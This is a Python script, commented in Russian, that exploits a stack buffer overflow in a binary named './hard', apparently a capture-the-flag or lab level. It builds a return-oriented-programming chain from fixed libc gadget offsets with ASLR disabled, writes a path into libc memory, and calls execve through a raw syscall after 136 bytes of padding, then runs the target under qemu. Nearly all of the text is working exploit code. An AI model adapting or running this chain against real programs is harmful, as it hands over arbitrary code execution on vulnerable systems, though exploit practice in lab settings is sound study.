import struct
import subprocess
import sys

# libc загружается по этой базе при запуске с setarch -R.
IMAGE_BASE = 0x0000fffff6600000

# Все адреса и значения в цепочке упаковываем как 64-битные
def pack(value):
    return struct.pack("<Q", value)

def libc(offset):
    # Переводим смещение данных в абсолютный адрес libc.
    return pack(IMAGE_BASE + offset)

# Цепочка Ropper: сохраняет имя скрипта по адресу libc+0x212000,
# записывает нулевой байт после имени и готовит аргументы execve:
# RDI = путь, RSI = NULL, RDX = NULL, RAX = 59.
rop = b""
rop += libc(0x0e5b07)       # pop rax; ret
rop += b"/tmp/ok."          # 8 байт пути, записываются по адресу ниже
rop += libc(0x11b9ba)       # pop rdi; ret
rop += libc(0x212000)       # адрес строки пути в libc
rop += libc(0x064a1b)       # mov qword ptr [rdi], rax; ret

rop += libc(0x0e5b07)       # pop rax; ret
rop += pack(0)              # нулевое слово для завершения строки и argv
rop += libc(0x11b9ba)       # pop rdi; ret
rop += libc(0x212008)       # адрес сразу после 8-байтового имени
rop += libc(0x064a1b)       # записать туда нулевое слово

rop += libc(0x11b9ba)       # pop rdi; ret
rop += libc(0x212000)       # RDI = адрес "/tmp/ok."
rop += libc(0x05c067)       # pop rsi; ret
rop += libc(0x212008)       # RSI указывает на нулевой аргумент
rop += libc(0x0e847d)       # pop rdx; xor eax, eax; ret
rop += libc(0x212008)       # RDX указывает на нулевой envp
rop += libc(0x0e5b07)       # pop rax; ret
rop += pack(0x3b)           # номер syscall execve для x86-64
rop += libc(0x0a0926)       # syscall; ret

# В start_level буфер занимает 128 байт; ещё 8 байт — сохранённый RBP.
# Поэтому адрес возврата начинается со смещения 136.
payload = b"A" * 136 + rop + b"\n"

# Запускаем.
result = subprocess.run(
    [
        "setarch", "aarch64", "-R",
        "qemu-amd64", "-L", "/",
        "/lib64/ld-linux-x86-64.so.2", "./hard",
    ],
    input=payload,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    check=False,
)

sys.stdout.buffer.write(result.stdout)
sys.stderr.buffer.write(result.stderr)